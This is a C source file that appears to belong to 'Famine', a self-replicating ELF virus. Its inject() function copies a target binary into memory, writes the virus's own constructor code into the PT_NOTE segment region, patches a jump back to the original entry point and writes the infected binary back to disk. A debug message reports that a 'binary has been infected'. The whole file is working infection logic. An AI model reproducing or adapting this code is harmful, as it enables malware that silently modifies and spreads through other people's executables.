#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void write_on_memory(const struct s_info *info, char *ptr)
{
	unsigned long index = 0;
	char *dst = ptr;
	char *src = info->ptr;
	
	while (index < info->data->p_offset + info->data->p_filesz)
	{
		*dst++ = *src++;
		index++;
	}
	while (index < info->note->p_offset)
	{
		*dst++ = 0;
		index++;
	}
	while (index < info->note->p_offset + PAYLOAD_SIZE)
	{
		*dst++ = 0;
		index++;
	}
}

static void replicate_on_memory(const struct s_info *info, char *ptr)
{
	char *dst;
	unsigned char *src;
	unsigned long back = 0;
	const Elf64_Addr entry_point = info->old_entry - (info->new_entry) - 66;

	dst = ptr + info->note->p_offset;
	src = (unsigned char *)&constructor;

	for (unsigned long index = 0; index < PAYLOAD_SIZE; index++)
	{
		if (*src== 0xe9 && back == 0)
			back = index + 1;
		*dst++ = *src++;
	}

	_memcpy(ptr + info->note->p_offset + back, &entry_point, sizeof(int));
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void inject(const struct s_info *info, const unsigned long m_entry, const int trace)
{
	char *ptr;

	if ((ptr = _mmap(NULL, info->note->p_offset + PAYLOAD_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		Exit(0);

	write_on_memory(info, ptr);
	replicate_on_memory(info, ptr);

	if (_write(info->fd, ptr, info->note->p_offset + PAYLOAD_SIZE) < 0)
		Exit(0);

	_munmap(ptr, info->note->p_offset + PAYLOAD_SIZE);

#ifdef DEBUG
	char buf1[] = "binary has been infected\n\n";
	_write(trace, buf1, _strlen(buf1));
	(void)m_entry;
#endif
}
